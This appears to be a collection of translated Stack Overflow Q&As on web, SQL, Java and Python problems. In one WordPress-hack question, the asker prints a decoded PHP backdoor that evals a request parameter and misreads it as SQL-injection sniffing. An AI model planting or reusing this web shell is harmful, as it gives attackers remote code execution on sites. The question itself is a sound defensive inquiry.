Here a jsfiddle as example : [http://jsfiddle.net/LqSwt/5/](http://jsfiddle.net/LqSwt/5/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T20:56:00.743

你应该使用css。表中要隐藏的列标题需要给一个单独的类。仅供参考 - html 元素可以分配多个类，主要是出于这样的原因。

因此，当您声明表格时，在您的 html 中执行以下操作：

```
<table id="myTable" class="noHeader"> 
```

然后在css中你可以使用：

```
.noHeader thead { display:none;} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-21T23:52:18.823

我认为 DataTables 所做的是创建两个 div，其中包含单独的表。它创建一个带有嵌套表的“标题” div，然后为正文创建一个相同的表。

尝试在表格完成后运行此代码，甚至可能在上面建议的 fnInitComplete 处理程序之后运行。

```
$(.dataTables_scrollHeadInner).find("tr").hide(); //The class name may differ for you.  Use firebug to find class name of that div that contains your header. 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-20T03:35:08.637

如果启用滚动（`sScrollX`/`sScrollY`在 dataTables 初始化选项中设置），dataTables 将更改表结构，如下所示：

```
div.dataTables_scroll
   div.dataTables_scrollHead
   div.dataTables_scrollBody
   [div.dataTables_scrollFoot] 
```

并且将thead克隆为`div.dataTables_scrollHead > table`，将scrollBody中原来的thead隐藏起来，以便在垂直滚动时得到一个固定的thead。

因此，在您的情况下，**您必须将克隆的thead隐藏在 中`div.dataTables_scrollHead`**，您可以在`fnInitComplete`回调中执行此操作，如下所示：

```
"fnInitComplete": function(oSettings) {
    $('.dataTables_scrollHead thead').hide();
} 
```

请参阅[jsfiddle](http://jsfiddle.net/royling/eYCda/2/)，希望这能解决您的问题。

# jquery - AJAX 重新加载后日期选择器不工作

> ID：13916519
> 
> 赞同：-2
> 
> 时间：2012-12-17T14:59:05.427
> 
> 标签：jquery, datepicker

我在一个 div 中有一个非常复杂的日期选择器，它在提交后使用 AJAX 重新加载，但在提交（以及页面的 AJAX 重新加载）之后，日期选择器不再工作。

日期选择器代码：

```
 dates[x] = $( "#from_"+x+", #to_"+x ).datepicker({ 
        dateFormat: "dd-mm-yy",
        numberOfMonths: 3,
        showWeek: true,
        maxDate: max_date_ini,
        minDate: min_date_ini, 
        beforeShow:function legen_array() {
            var from_of_to = this.id.indexOf("from_") != -1 ? "from" : "to";
            //eerst een check of er niet nog een datepicker periode half gevuld is (want dan is overlap mogelijk)
            if (periode_half_gevuld != x && periode_half_gevuld != 0){
                alert('Er is nog een periode niet geheel ingevuld, er is alleen een vanaf of alleen een tot datum ingevuld. Maak deze periode eerst compleet of maak hem leeg door op verwijderen te klikken');
                return false;           
            }
            var date_from_open = $("#from_"+x).val();
            var date_to_open = $("#to_"+x).val();
            var timestamp_from_open = Date.UTC(date_from_open.substring(6,10),date_from_open.substring(3,5)-1,date_from_open.substring(0,2))/1000;
            var timestamp_from_open_teller = Date.UTC(date_from_open.substring(6,10),date_from_open.substring(3,5)-1,date_from_open.substring(0,2))/1000;
            var timestamp_to_open = Date.UTC(date_to_open.substring(6,10),date_to_open.substring(3,5)-1,date_to_open.substring(0,2))/1000;
            //als from en to gevuld zijn dan eerst deze waardes uit array halen (Anders kan 1 dag verder of terug niet gekozen worden)
            if (timestamp_from_open > 0 && timestamp_to_open > 0){
                geselecteerde_vanaf_datums.splice( $.inArray(timestamp_from_open,geselecteerde_vanaf_datums), 1 );
                geselecteerde_tot_datums.splice( $.inArray(timestamp_to_open,geselecteerde_tot_datums), 1 );
                while (timestamp_from_open_teller <= (timestamp_to_open+1)){
                    datums_niet_beschikbaar.splice( $.inArray(timestamp_from_open_teller,datums_niet_beschikbaar), 1 );
                    timestamp_from_open_teller = timestamp_from_open_teller + 86400;                    
                }
                if (this.id.indexOf("from_") == 0 && $("#to_"+x).val() != '' && geselecteerde_tot_datums.length >= 1){
                    var min_datum = new Date (getNextMinVal(geselecteerde_tot_datums, timestamp_to_open)*1000);
                    $('#from_'+x).datepicker('option', {minDate: min_datum,maxDate: $("#to_"+x).val()});
                }
                else if (this.id.indexOf("from_") == 0 && $("#to_"+x).val() != '' && geselecteerde_tot_datums.length == 0){
                    $('#from_'+x).datepicker('option', {minDate: new Date(volgend_jaar, 1 - 1,1),maxDate: $("#to_"+x).val()});
                }
                else if (this.id.indexOf("from_") == -1 && $("#from_"+x).val() != '' && geselecteerde_vanaf_datums.length >= 1){
                    var max_datum = new Date (getNextMaxVal(geselecteerde_vanaf_datums, timestamp_from_open)*1000);
                    $('#'+this.id).datepicker('option', {minDate:$("#from_"+x).val(),maxDate: max_datum});
                }
                else if (this.id.indexOf("from_") == -1 && $("#from_"+x).val() != '' && geselecteerde_vanaf_datums.length == 0){
                    $('#to_'+x).datepicker('option', {minDate: $("#from_"+x).val(),maxDate: new Date(volgend_jaar, 12,0)});
                }
                else {alert('10');}
            }
            else if(timestamp_from_open > 0 && timestamp_to_open < 0 && from_of_to == 'to' && geselecteerde_vanaf_datums.length >= 1){
                var closest_max = getNextMaxVal(geselecteerde_vanaf_datums, timestamp_from_open);
                $("#"+this.id).datepicker('option', {maxDate: new Date(closest_max*1000)});
                $("#"+this.id).datepicker('option', {minDate: new Date(timestamp_from_open*1000)});
            }
            else if(timestamp_from_open < 0 && timestamp_to_open > 0 && from_of_to == 'from'){
                var closest_min = getNextMinVal(geselecteerde_tot_datums, timestamp_to_open);
                $("#"+this.id).datepicker('option', {minDate: new Date(closest_min*1000)});
                $("#"+this.id).datepicker('option', {maxDate: new Date(timestamp_to_open*1000)});
            }
        },
        beforeShowDay: unavailable,
        onSelect: function(selectedDate) {
                var option = this.id.indexOf("from_") != -1 ? "minDate" : "maxDate"; 
                dates[x].not(this).datepicker("option", option, selectedDate); 
        },
        onClose: function (geselecteerdedatums) {
            var from_of_to = this.id.indexOf("from_") != -1 ? "from" : "to"; 
            var date_from = $("#from_"+x).val();
            var date_to = $("#to_"+x).val();
            var timestamp_from = Date.UTC(date_from.substring(6,10),date_from.substring(3,5)-1,date_from.substring(0,2))/1000;
            var timestamp_to = Date.UTC(date_to.substring(6,10),date_to.substring(3,5)-1,date_to.substring(0,2))/1000;
            var aantal_dagen = (timestamp_to - timestamp_from)/86400;
            if (timestamp_from > 0 && timestamp_to > 0){
                    geselecteerde_vanaf_datums.push(timestamp_from);
                    geselecteerde_vanaf_datums.sort();
                    geselecteerde_tot_datums.push(timestamp_to);
                    geselecteerde_tot_datums.sort();
                    geselecteerde_tot_datums.reverse();
                while (timestamp_from <= timestamp_to){
                    datums_niet_beschikbaar.push(timestamp_from);
                    timestamp_from = timestamp_from + 86400;
                }
                periode_half_gevuld = 0;
                $("#half_gevulde_datepicker").val(0);
                $("#datums_bezet").val(datums_niet_beschikbaar);
                $("#datums_vanaf").val(geselecteerde_vanaf_datums);
                $("#datums_tot").val(geselecteerde_tot_datums);
            }
            else if (this.value != ''){
                periode_half_gevuld = x;
                $("#half_gevulde_datepicker").val(x);
            }
        }
    }); 
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T15:13:13.390

我认为您必须在 AJAX 重新加载后再次初始化日期选择器。

```
jQuery('.datepicker').datepicker({...}); 
```

# sql - 如何将 3 个查询合二为一

> ID：13916521
> 
> 赞同：3
> 
> 时间：2012-12-17T14:59:12.647
> 
> 标签：sql, sql-server, multiple-tables

我有 3 个查询最终获得了我的日常财务信息。我想做的是将我需要的列组合为 1 个输入。我试着做派生表，但它非常草率而且没有用。有没有人对我如何将这 3 个结合起来在 1 行上给我输出有任何建议？

这是我的查询：

```
SELECT        ReportCategoryID, ReportCategoryName, PrintOrder, QTY, NetAmt, customers, Average
FROM            dbo.fRevenueSummary(@startdate, @enddate) AS fRevenueSummary_1 
```

第二个查询：

```
SELECT        COUNT(*) AS count, SUM(TicketsDetails.dblTotal) AS Merch_Total
FROM            TicketsDetails INNER JOIN
                         Surcharges ON TicketsDetails.Reference_ID = Surcharges.Surcharge_ID INNER JOIN
                         SurchargesTypes ON Surcharges.lSurchargeTypeID = SurchargesTypes.lSurchargeTypeID
WHERE        (TicketsDetails.dtCreated BETWEEN @startdate AND @enddate) AND (SurchargesTypes.lSurchargeTypeID = '2') AND (TicketsDetails.bPaid = 1) AND 
                         (TicketsDetails.Detail_Type_ID = 3) AND (NOT (TicketsDetails.sDescription = N'TIP')) 
```

第三个查询：

```
SELECT        SUM(dblRegLabor) AS Regular_Amount, SUM(dblOTLabor) AS OT_Amount
FROM            TimeClock
WHERE        (dtTimeIn > @startdate) AND (dtTimeOut < @enddate) AND (sDept = '1') OR
                         (dtTimeIn > @startdate) AND (dtTimeOut < @enddate) AND (sDept = '2') OR
                         (dtTimeIn > @startdate) AND (dtTimeOut < @enddate) AND (sDept = '3') OR
                         (dtTimeIn > @startdate) AND (dtTimeOut < @enddate) AND (sDept = '4') OR
                         (dtTimeIn > @startdate) AND (dtTimeOut < @enddate) AND (sDept = '5') OR
                         (dtTimeIn > @startdate) AND (dtTimeOut < @enddate) AND (sDept = '6') OR
                         (dtTimeIn > @startdate) AND (dtTimeOut < @enddate) AND (sDept = '7') 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T15:03:15.173

最简单的方法是这样

```
SELECT *
FROM
(
    SELECT        ReportCategoryID, ReportCategoryName, PrintOrder, QTY, NetAmt, customers, Average
    FROM            dbo.fRevenueSummary(@startdate, @enddate) AS fRevenueSummary_1
)
,
(
    SELECT        COUNT(*) AS count, SUM(TicketsDetails.dblTotal) AS Merch_Total
    FROM            TicketsDetails INNER JOIN
                         Surcharges ON TicketsDetails.Reference_ID = Surcharges.Surcharge_ID INNER JOIN
                         SurchargesTypes ON Surcharges.lSurchargeTypeID = SurchargesTypes.lSurchargeTypeID
    WHERE        (TicketsDetails.dtCreated BETWEEN @startdate AND @enddate) AND (SurchargesTypes.lSurchargeTypeID = '2') AND (TicketsDetails.bPaid = 1) AND 
                         (TicketsDetails.Detail_Type_ID = 3) AND (NOT (TicketsDetails.sDescription = N'TIP'))
)
,
(
    SELECT        SUM(dblRegLabor) AS Regular_Amount, SUM(dblOTLabor) AS OT_Amount
    FROM            TimeClock
    WHERE        (dtTimeIn > @startdate) AND (dtTimeOut < @enddate) AND (sDept = '1') OR
                         (dtTimeIn > @startdate) AND (dtTimeOut < @enddate) AND (sDept = '2') OR
                         (dtTimeIn > @startdate) AND (dtTimeOut < @enddate) AND (sDept = '3') OR
                         (dtTimeIn > @startdate) AND (dtTimeOut < @enddate) AND (sDept = '4') OR
                         (dtTimeIn > @startdate) AND (dtTimeOut < @enddate) AND (sDept = '5') OR
                         (dtTimeIn > @startdate) AND (dtTimeOut < @enddate) AND (sDept = '6') OR
                         (dtTimeIn > @startdate) AND (dtTimeOut < @enddate) AND (sDept = '7')
) 
```

但如果它们之间没有关系，您将返回笛卡尔积。

我不认为没有笛卡尔积就可以组合 3 个不同的查询。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T15:03:36.100

**这不是您问题的答案，**但它可以简化您的想法，知道您的第三个查询可以大大简化：

```
SELECT  SUM(dblRegLabor) AS Regular_Amount, SUM(dblOTLabor) AS OT_Amount
FROM    TimeClock
WHERE   (dtTimeIn > @startdate) AND (dtTimeOut < @enddate) AND (sDept = IN('1', '2', '3', '4', '5', '6', '7')) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-17T15:09:17.750

好吧，如果您想要丑陋、凌乱的解决方案，您可以在每个语句周围加上括号，然后将每个语句视为一个巨大的表格`JOIN`（类似于 Marc 说明的内容）。

如果您想要一个好的解决方案，您将不得不描述您实际尝试做的事情。在不了解您的数据和实际任务的情况下，[我们无法优化您的代码](https://stackoverflow.com/a/13511317/1584772)。

# lsa - 句子之间的相似度是如何用 LSA 计算的？

> ID：13916527
> 
> 赞同：1
> 
> 时间：2012-12-17T14:59:24.023
> 
> 标签：lsa

当计算单词之间的相似度时，我已经了解 LSA 是如何工作的。我正在使用网站 lsa.colorado.edu 中的 LSA，但我找不到如何计算句子或多个单词之间相似度的来源。它只是通过对所有成对相似性进行平均来完成的吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-22T02:23:16.030

您可以简单地将词向量组合在一起，然后将最终总和作为句子向量返回。由于这些表示与单词表示具有相同的类型，因此您可以轻松地使用现有方法来计算语义相似度。

然后要计算语义相似度，您可以使用这些向量之间的余弦值。

我目前正在使用[S-Space](https://github.com/fozziethebeat/S-Space/wiki/DocumentRepresentations)库，它有一个执行此任务的[DocumentVectorBuilder](https://github.com/fozziethebeat/S-Space/blob/master/src/main/java/edu/ucla/sspace/common/DocumentVectorBuilder.java?source=c)类。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-07-11T04:23:58.937

您使用所谓的点积来计算两个向量之间的余弦相似度。因此，一旦从术语文档频率矩阵中获得 SVD 矩阵，您就可以在两个向量之间应用点积公式。

# python - 使用单个模板渲染到自定义输出文件名

> ID：13916531
> 
> 赞同：0
> 
> 时间：2012-12-17T14:59:41.223
> 
> 标签：python, jinja2

我需要使用 jinja 使用相同的模板创建一系列报告。但我想将每个报告放在不同的渲染文件中。

我在 jinja 的文档中找不到相关内容。

有没有办法修改渲染的输出文件名？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T15:03:59.500

Maybe this would help?

```
import jinja2

env = jinja2.Environment( loader = jinja2.FileSystemLoader('templates/') )

def render_template( filename_template, filename_output ):
  nice = env.get_template( filename_template ).render()
  with open(filename_output,'w') as fh:
    fh.write(nice) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:05:24.007

What is the problem with different files?

```
>>> from jinja2 import Template
>>> template = Template('Hello {{ name }}!')
>>> for n in ["John", "Doe"]:
>>>     with open(n + ".txt", "w") as f:
>>>         print >> f, template.render(name=n) 
```

# mysql - 无法以root身份重置mysql密码

> ID：13916532
> 
> 赞同：1
> 
> 时间：2012-12-17T14:59:47.030
> 
> 标签：mysql, passwords

我正在使用带有 mysql 5 版本的 CentOs，忘记了我的密码，我无法重置它，我所做的是

```
/etc/init.d/mysqld stop

mysqld_safe --skip-grant-tables &
mysql -u root

mysql>  update mysql.user set password=PASSWORD("pass") where User='root'; 
```

收到这条消息

```
Query OK, 0 rows affected (0.00 sec)
Rows matched: 0  Changed: 0  Warnings: 0

mysql> flush privileges; exit;
Query OK, 0 rows affected (0.00 sec) 
```

停止并分层mysql，但无论如何

```
ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: NO) 
```

我已经尝试过这个解决方案[mysql 官方网站](http://dev.mysql.com/doc/refman/5.1/en/resetting-permissions.html)，无论如何都无法正常工作。有什么建议么？

# 更新

**我的主要用户`admin`不是`root`所以我更改了管理员密码现在一切正常，对此感到抱歉。感谢大家。**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T15:10:29.853

仔细查看您的错误消息：

```
ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: NO)
                                                               ^^^^^^^^^^^^^^^^^^ 
```

您可能设置了新密码，但没有使用它进行连接。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-09-26T02:05:43.887

这对我有用

```
 UPDATE mysql.user SET Password=PASSWORD('foobar') WHERE User='tom' AND Host='localhost'; 
```

这对我不起作用

```
 SET PASSWORD FOR 'user-name-here'@'hostname-name-here' = PASSWORD('new-password-here'); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-17T15:09:40.937

```
Access denied for user 'root'@'localhost'  (using password: NO) 
```

确保尝试登录的内容肯定是发送密码

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-12-17T15:05:58.680

Try to flush privalages after resetting the password:

```
 UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
    FLUSH PRIVILEGES; 
```

If that doesn't work follow these steps: [How to Reset the Root Password](http://dev.mysql.com/doc/refman/5.0/en/resetting-permissions.html)

# tfs - TFS“缺失”变更集

> ID：13916535
> 
> 赞同：1
> 
> 时间：2012-12-17T15:00:02.913
> 
> 标签：tfs

谁能告诉我我的变更集去了哪里？我确定我检查了对文件的更改，但是在历史上没有提到我，我的更改却神奇地出现在另一个开发人员后来的更改中！！！！

TFS 管理员是否可以“删除”一个变更集，使其不再出现在历史记录中？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T15:08:24.243

是的 - TFS 有一个称为“回滚”的功能，它允许管理员撤消更改，就像它从未发生过一样：

[http://blogs.msdn.com/b/buckh/archive/2011/03/16/hidden-gem-in-tfs-2010-how-to-rollback-a-changeset-with-tf-rollback.aspx](http://blogs.msdn.com/b/buckh/archive/2011/03/16/hidden-gem-in-tfs-2010-how-to-rollback-a-changeset-with-tf-rollback.aspx)

它只对管理员可用，并且只能从命令行使用，因此大多数人甚至不知道它的存在，并且您必须非常有意识地使用它（即不可能“意外”回滚某些东西）。一般而言，系统设计为始终保留历史记录，但如果有人不小心检入了他们的 14GB MP3 库，则需要有一种方法将其从存储库中删除。

但是，由于您在以后的文件中看到了您的更改，这可能不是发生的情况。我从来没有听说过在我管理的系统上发生过这样的事情，尽管它可能是一个不起眼的错误——你正在运行什么版本/构建/更新？是否已完全修补？能给个版本号吗？

此外，当您单击作为此签入的一部分更新的文件并查看历史记录时，您的更新是否在列表中？当您查看文件夹/项目历史记录时，您是否只是错过了更新？您可以查看多种方法和范围的历史记录，我很想知道您的签到是否显示在某些地方，但不是在您希望看到的所有地方。

# windows - AutoIt - Windows 错误弹出窗口类

> ID：13916538
> 
> 赞同：1
> 
> 时间：2012-12-17T15:00:04.490
> 
> 标签：windows, popup, autoit

我希望能够通过使用 AutoIt 脚本自动检测 Windows 弹出窗口，该脚本将在后台运行。基本上，我有一个 AutoIt 脚本在我的操作系统上做一些事情，我需要知道一切是否正常。目前，当满足某些条件时，Windows 会弹出一个错误。我唯一想要的是一个日志文件，上面写着“一切正常/崩溃”，不需要处理错误。我说的是那些发出可怕声音的红色 Windows 弹出窗口。只有那些应该被我的脚本捕获。

我考虑过将该函数与正确的类一起使用，如果弹出窗口实际上...弹出`WinWaitActive`，它将返回。`Success`问题是我需要这个*正确的课程*，但我没有找到任何关于它的信息。如果有人有任何想法...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-18T08:42:22.697

使用[AutoIt Window Information Tool](http://www.autoitscript.com/autoit3/docs/intro/au3spy.htm)来找出答案。这个页面上有一个“窗口标题”的链接，从那里你可以进入“高级模式”，去阅读它，你应该准备好解决你的问题了！尝试后再次询问你的运气=）

# jquery - 自定义 Django 表单在本地正确提交，但在服务器上不正确

> ID：13916544
> 
> 赞同：0
> 
> 时间：2012-12-17T15:00:29.523
> 
> 标签：jquery, django, django-forms

我完全被难住了。我有一个用一些 JS 定制的用于交互的表单。这真的很简单。它在本地工作得很好。但是，在服务器上，当用户使用下拉选择时，表单不会提交。

我看不到任何导致这种情况的原因，这让我发疯。

现场表格在这里：[http ://trainer.cbirt.org/events/test-event/sign-up/](http://trainer.cbirt.org/events/test-event/sign-up/)

JS 现在没有压缩，所以我可以解决这个问题。

到目前为止，我已经尝试过：

*   吹走并重建服务器上的 VE
*   将相关的js本地放置到文件中
*   修改 js 的工作方式 七种方式到星期天

我能想到的唯一要做的事情就是在本地托管所有 JS，但这没有任何意义，因为提交不是基于 JS 的。

欢迎任何和所有建议。

表格代码：

```
{% extends "events/base.html" %}

{% block page_class %}full-screen{% endblock page_class %}

{% block content%}

<h1>Sign Up for {{ event.title }}</h1>

<ul class="instructions">
<li>Fill in your name and email address, and tell us if you are a Team member</li>
<li>Fill in the form that appears</li>
<li>Click Submit</li>
</ul>

{% if form.errors %}
    <ul class="errors">
        {% for error in form.errors %}
            {% if error == "first_name" %}
                <li>Please enter your <strong>first name</strong>.</li>
            {% endif %}
            {% if error == "last_name" %}
                <li>Please enter your <strong>last name</strong>.</li>
            {% endif %}
            {% if error == "email" %}
                <li>Please enter your <strong>email</strong>.</li>
            {% endif %}
        {% endfor %}
    </ul>
{% endif %}

<form method="post" action="" id="signup">

    {% csrf_token %}

    <div class="form_block">
        <label for="id_first_name">First name:</label>
        <input id="id_first_name" type="text" name="first_name" maxlength="50" />
    </div>

    <div class="form_block">
        <label for="id_last_name">Last name:</label>
        <input id="id_last_name" type="text" name="last_name" maxlength="50" />
    </div>

    <div class="form_block">
        <label for="id_email">Email:</label>
        <input id="id_email" type="text" name="email" maxlength="75" />
    </div>

    <div class="form_block team_mem">
        <label for="id_tbi_team_member">Are you a TBI Team Member?</label>
        <div class="yes-no">
            <span class="yes">Yes</span>
            <span class="no">No</span>
        </div>
        <input type="checkbox" name="tbi_team_member" id="id_tbi_team_member" />
    </div>

    <section class="team-member">
        <div class="form_block">
            <label for="id_hotel_checkin_date">Hotel checkin date:</label>
            <input type="text" name="hotel_checkin_date" id="id_hotel_checkin_date" />
        </div>

        <div class="form_block">
            <label for="id_hotel_checkout_date">Hotel checkout date:</label>
            <input type="text" name="hotel_checkout_date" id="id_hotel_checkout_date" />
        </div>

        <div class="form_block">
            <label for="id_yes_share">Are you willing to share a room?</label>
            <div class="yes-no">
                <span class="yes">Yes</span>
                <span class="no">No</span>
            </div>
            <input type="checkbox" name="yes_share" id="id_yes_share" />
        </div>

        <div class="form_block">
            <label for="id_share_suite">Are you willing to share a suite?</label>
            <div class="yes-no">
                <span class="yes">Yes</span>
                <span class="no">No</span>
            </div>
            <input type="checkbox" name="share_suite" id="id_share_suite" />
        </div>

        <div class="form_block">
            <label for="id_team_dinner">Will you join us for the team dinner?</label>
            <div class="yes-no">
                <span class="yes">Yes</span>
                <span class="no">No</span>
            </div>
            <input type="checkbox" name="team_dinner" id="id_team_dinner" />
        </div>

    </section>

    <section class="not-team-member">

        <div class="form_block">
            <h3>Price of training per day - $40</h3>
        </div>

        <div class="form_block">
            <label for="id_payment_method">Payment method:</label>
            <select name="payment_method" id="id_payment_method">
                <option value="" selected="selected">---------</option>
                <option value="2">Cash</option>
                <option value="3">Check</option>
                <option value="4">PO</option>
            </select>
        </div>

        <div class="form_block">
            <h4>Cash and checks will be collected at the door.</h4>
        </div>

    </section>

    <section class="general">

        <div class="form_block">
            <label for="id_dietary_restrictions">Do you have dietary restrictions?</label>
            <input id="id_dietary_restrictions" type="text" name="dietary_restrictions" maxlength="200" />
        </div>

        <div class="form_block">
            {% if event.pdu %}
                <p>{{ event.pdu.content }}</p>
            {% endif %}
            {% if event.ceu %}
                <p>{{ event.ceu.content }}</p>
            {% endif %}
        </div>

        <div class="form_block">
            <label for="id_your_notes">Notes and special accommodations:</label>
            <textarea id="id_your_notes" rows="10" cols="40" name="your_notes"></textarea>
        </div>

    </section>

    <div class="form_block">
        <input type="submit" value="Submit" class="button" id="event-signup" />
    </div>
</form>

{% endblock content %}

{% block addthis %}{% endblock addthis %} 
```

和 JS

```
$('#id_payment_method').change(function(event) {
    //console.log($(this));
    $('option').each(function(event) {
        $('option:not(:selected)').attr('selected', false);
        $('option:selected').attr('selected', true);
    });
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T16:31:12.630

对于我所看到的，有一些基于单选框隐藏/显示的字段。

我会检查以确保提交表单时不需要这些。如果是，您可能会卡在同一页面上，但由于未显示字段错误，因此没有给出任何输出。

您可以通过禁用单选字段上的 javascript 并显示每个字段的字段错误来进行调试。

希望这会有所帮助。

# java - 如何判断一个double变量是否有整数值？

> ID：13916550
> 
> 赞同：2
> 
> 时间：2012-12-17T15:01:04.820
> 
> 标签：java, math, integer, double, double-precision

我正在尝试使用 Java 查找二次方程的可能整数根。

![在此处输入图像描述](../Images/2e1652a67d9159300113e8f5b5ccd54a.png)

这是我的代码片段：

```
double sqrtDiscriminant = Math.sqrt(b * b - 4 * a * c);

double  root1 = ((-1.0 * b) - sqrtDiscriminant) / (2.0 * a);
double  root2 = ((-1.0 * b) + sqrtDiscriminant) / (2.0 * a); 
```

对于`a = 2`,`b = -1`和`c = -40755`, 其中一个根是`143.0` (`143.0`当我回显它时打印到控制台所以我只对这样的双精度值感兴趣, 不是`143.00001`) 我的问题是, 我怎样才能确保任何根都有一个整数值？如果`root1 = 143.0`然后例如`root1 == 143`应该返回true。

我试过`root1 == Math.floor(root1)`了，但没有用。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T15:04:21.073

You should never use equality checks when working with double-values. Define an accuracy value like

```
double epsilon = 0.0000001; 
```

Then check whether the difference is nearly equal to `epsilon`:

```
if(Math.abs(Math.floor(value)-value) <= epsilon) { } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-17T15:05:03.483

You can test the integer value if it's a solution also:

```
x = Math.floor(root1);
if(a*x*x+b*x+c == 0)
... 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-17T15:07:01.920

If I would be you, I will simply take the `int/long` value of the roots and re-verify the equation to make sure that `int/long` value of the root is OK or not e.g.

```
// using round because an equivalent int/long may be represented by a near binary fraction
// as floating point calculations aren't exact
// e.g. 3.999999.. for 4
long longRoot = Math.round(root1); 
if(a*longRoot*longRoot +  b*longRoot + c==0){
    //its valid int root
}else{
    //ignore it
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-17T15:10:24.310

如果您想要整数结果，请使用 round 因为您的错误可能意味着该数字稍大或稍小。

```
long l = Math.round(value); 
```

要四舍五入到固定的小数位数，您可以使用

```
double d = Math.round(value * 1e6) / 1e6; // six decimal places. 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-17T15:06:57.353

You can try as

```
Math.rint(d) == d 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-12-17T15:10:11.210

```
if ((variable == Math.floor(variable)) && !Double.isInfinite(variable)) {
    // int
} 
```

如果变量等于 Math.floor 则它的整数。无限检查是因为它对它不起作用。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-12-18T10:07:55.893

最好的方法是检查`(Math.floor(root1)-root1)<=0.0000001` 它是否会给你正确的输出。

# php - WordPress 黑客尝试

> ID：13916551
> 
> 赞同：0
> 
> 时间：2012-12-17T15:01:16.873
> 
> 标签：php, wordpress, security

我为小型客户网站运行了一个安装了几十个 WordPress 的 VPS。

我刚刚注意到一个站点有一个名为“pnxnfup.php”的 php 脚本，其中包含一个加载 base64 字母数字字符。

在站点的根目录中还有很多没有扩展名的文件——只是随机的字母数字字符串——其中的文件看起来像是在记录 IP 地址——我猜这些是访问者的 IP 地址（我的在里面）。

有人知道这可能是什么类型的漏洞吗？

**更新：18/12/12**

好的，我设法解码了 pnxnfup.php 的内容

当我解码原始 php 文件时，它包含更多 base64 编码内容，其中包含随机乱码 php 注释，我必须在解码文件的其余部分之前手动删除这些注释。

解码后，我发现更多带有更多乱码 php 注释的 base64 编码字符串。一旦我重复了剥离和解码过程（呸！），我就剩下了这个：

```
if(isset($_REQUEST['a'.'s'.'c']))
eval
(stripslashes($_REQUEST['a'.'sc'])); 
```

我大致了解这段代码在做什么（嗅探带有 asc 参数的请求，这将指示可能针对 sql 注入的 url），但我不明白这对黑客本身有何价值。我猜黑客必须渗透得更深，而我还遗漏了其他东西？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T15:17:38.983

[如果您查看wordpress 支持站点](http://wordpress.org/support/topic/evalbase64_decode-hacked)，这似乎相当普遍

但它到底是什么很难说，如果我是你，我会设置一个沙盒环境并玩弄一下以找出黑客的目的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T15:34:24.123

可能该网站使用的是“免费”主题。其中大多数具有收集您的密码和登录以在您的网站上添加恶意软件脚本的代码。您有网站的备份吗？我强烈建议您清理所有文件，然后更改您的 FTP 密码（并登录，如果可能的话），然后重新上传所有文件。

顺便说一句，也许 Sucuri 可以帮助您找到一些受感染的文件：[http ://sitecheck.sucuri.net/results/YOURURL.com/](http://sitecheck.sucuri.net/results/YOURURL.com/)

# c# - C# 使用数据集设置非常基本的报告

> ID：13916553
> 
> 赞同：0
> 
> 时间：2012-12-17T15:01:28.433
> 
> 标签：c#, winforms, dataset, reportviewer

我正在尝试在我的应用程序中实现一些基本报告。我已经做过的：

*   设置新数据集（仅包含 1 个包含 3 个字段的表）
*   根据数据集设计简单的.rdlc文件

![在此处输入图像描述](../Images/5d0cd3f3ae5aca9508fe355747578a0b.png)

然后添加reportViewer 控件并将其指向创建的.rdlc 文件。

![在此处输入图像描述](../Images/f7f836647baac165c4772ffc65b829b2.png)

我正在使用带有以下代码的 reportViewer 显示表单：

```
FormReport formReport = new FormReport();
formReport.ShowDialog(); 
```

结果我得到了一个空的`reportViewer`；即使没有标题和虚拟线对象等。没有想法这里出了什么问题。

![在此处输入图像描述](../Images/266f336d0bdb4b312a0c5116b983ea09.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T17:14:48.480

我已经解决了。加载报告表单时，我添加以下代码：

```
reportViewer1.RefreshReport(); 
```

它现在有效。不知道为什么报表向导不自动添加它。

# javascript - 查找集合模型的 idAttribute

> ID：13916554
> 
> 赞同：1
> 
> 时间：2012-12-17T15:01:31.790
> 
> 标签：javascript, backbone.js

在集合的上下文中，我想检索基于某些包含模型数据的对象的模型实例，但我不想对 idAttribute 进行硬编码。

当您已经有一个模型实例时，Backbone 使事情变得容易，您可以访问它的`.id`属性并将其整理出来，但我似乎找不到另一种方式，除了创建模型实例只是为了得到它`idAttribute`。

例如：

```
var Cat = Backbone.Model.extend({
  defaults: {
    name: '',
    age: null
  },

  idAttribute: 'name'
});

var PushCollection = Backbone.Collection.extend({
  initialize: function () {
    coll = this;
    somePushConnection.on('deleted', function (deleted) {
      _.each(deleted, function (obj) {
        // obj being something like: {name: 'mittens', age: 302}
        var model = coll.get(obj[coll.model.idAttribute]); // Can't do this!
